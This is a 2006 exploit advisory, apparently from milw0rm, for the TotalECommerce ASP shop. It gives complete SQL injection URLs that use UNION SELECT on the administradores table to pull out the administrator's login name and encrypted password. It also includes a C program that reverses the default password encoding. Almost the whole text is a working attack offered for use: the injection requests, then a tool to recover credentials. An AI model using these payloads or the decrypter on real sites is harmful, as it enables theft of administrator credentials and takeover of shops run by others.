Original advisory: http://www.nukedx.com/?viewdoc=18
Advisory by: nukedx
Full PoC
Explotation:
GET -> http://[victim]/[dir]/index.asp?secao=[PageID]&id=[SQL]
EXAMPLE 1 -> http://[victim]/[dir]/index.asp?secao=25&id=-1+UNION+select+senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha+from+administradores
EXAMPLE 2 -> http://[victim]/[dir]/index.asp?secao=25&id=-1+UNION+select+login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login+from+administradores
with example 1 remote attacker can get admin's encrypted password and with example 2 remote attacker can get admin's login name
[PageID]: must be working page id you can get some from frontpage.
<--Decrypter code-->
<--Note: This decrypter just decrypts default data
If webmaster changed te_chave value in funcoes.asp
this decrypter wont decrypt data so you need to 
make your own decrypter
-->
<--C Source-->
/*********************************************
*        TotalECommerce PWD Decrypter        *
*        Coded by |SaMaN| for nukedx         *
*          http://www.k9world.org            *
*              IRC.K9World.Org               *
*Advisory: http://www.nukedx.com/?viewdoc=18 *
**********************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

int main()
{
  char buf[255];
  char buf2[255];
  char buf3[255];
  char *texto;
  char *vcrypt;   
  int i,x,z,t = 0;
  char saman;
  texto = buf;
  vcrypt = buf2;
  printf("%s", "|=------------------------------------=|\n");
  printf("%s", "   Coded by |SaMaN| @ IRC.K9World.Org\n");
  printf("%s", "|=------------------------------------=|\n\n");
  printf("%s", "Enter crypted password: ");
  scanf("%200s", buf);
  if (!texto)
  vcrypt = "";

  for (i = 0; i < strlen(texto); i++)
  {
    if ((vcrypt == "") || (i > strlen(texto)))
    x = 1;
    else 
    x = x + 1;
    t = buf[i];
    z = 255 - t;
    saman = toascii(z);
    snprintf(buf3, 250, "%c", saman);
    strncat(buf2, buf3, 250);
  }
  printf("Result: %s\n", buf2);
  return;
}
<--End of code-->
<--Thanks |SaMaN| for decrypter-->

// milw0rm.com [2006-03-04]